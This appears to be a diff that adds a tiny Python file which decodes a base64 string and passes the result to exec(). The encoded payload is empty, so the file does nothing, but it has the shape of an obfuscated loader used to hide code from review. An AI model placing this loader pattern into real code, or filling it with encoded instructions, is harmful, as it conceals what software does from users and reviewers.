@@ -1,0 +1,9 @@
+
+
+import base64
+
+script = b''
+
+exec(base64.b64decode(script))
+
+
